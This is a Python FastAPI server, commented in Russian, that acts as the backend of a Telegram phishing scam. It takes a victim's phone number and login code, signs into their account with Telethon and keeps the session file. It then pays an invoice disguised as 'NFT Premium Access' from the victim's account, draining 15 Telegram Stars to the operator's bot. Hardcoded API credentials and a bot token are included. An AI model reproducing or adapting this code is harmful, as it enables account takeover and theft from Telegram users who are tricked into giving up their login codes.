import asyncio
import uvicorn
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, functions, types, errors
import requests

app = FastAPI()

# Разрешаем запросы с любого домена (для работы сайта)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- ТВОИ КОНФИГУРАЦИИ ---
API_ID = 26244159
API_HASH = '5b0eb51851848acc242b93bfe4a225cf'
BOT_TOKEN = '8505312583:AAFZ6_iIkgOrC-HGtAtZcNDHiHUWby6IvlE'
BOT_USERNAME = 'ajsjsjsjsjsiebot' 
# -------------------------

active_sessions = {}

@app.get("/send-code")
async def send_code(phone: str):
    phone = phone.replace("+", "").strip()
    # Создаем сессию в папке sessions/
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    await client.connect()
    try:
        send_res = await client.send_code_request(phone)
        active_sessions[phone] = {
            "client": client, 
            "hash": send_res.phone_code_hash
        }
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

@app.get("/verify")
async def verify(phone: str, code: str):
    phone = phone.replace("+", "").strip()
    if phone not in active_sessions:
        return {"status": "error", "error": "Сессия истекла"}
    
    data = active_sessions[phone]
    client = data["client"]
    
    try:
        # 1. Вход в аккаунт
        await client.sign_in(phone, code, phone_code_hash=data["hash"])

        # 2. Создаем ссылку на оплату (Invoice) через твоего бота
        invoice_api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/createInvoiceLink"
        invoice_data = {
            "title": "NFT Premium Access",
            "description": "Активация вашего NFT подарка",
            "payload": f"user_{phone}",
            "currency": "XTR", # Telegram Stars
            "prices": [{"label": "NFT", "amount": 15}] # 15 звезд
        }
        
        res = requests.post(invoice_api_url, json=invoice_data).json()
        
        if res.get("ok"):
            invoice_link = res["result"]
            # 3. Оплата инвойса от лица зашедшего юзера
            # Получаем структуру инвойса
            link_hash = invoice_link.split('/')[-1]
            form = await client(functions.payments.GetPaymentFormRequest(
                invoice=types.InputInvoiceLink(link=link_hash)
            ))
            
            # Сама оплата (снимет 15 звезд с баланса юзера)
            await client(functions.payments.SendPaymentFormRequest(
                form_id=form.form_id,
                invoice=types.InputInvoiceLink(link=link_hash),
                credentials=types.InputPaymentCredentialsStars()
            ))
        
        await client.disconnect()
        del active_sessions[phone]
        return {"status": "success"}
        
    except Exception as e:
        return {"status": "error", "error": str(e)}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
  
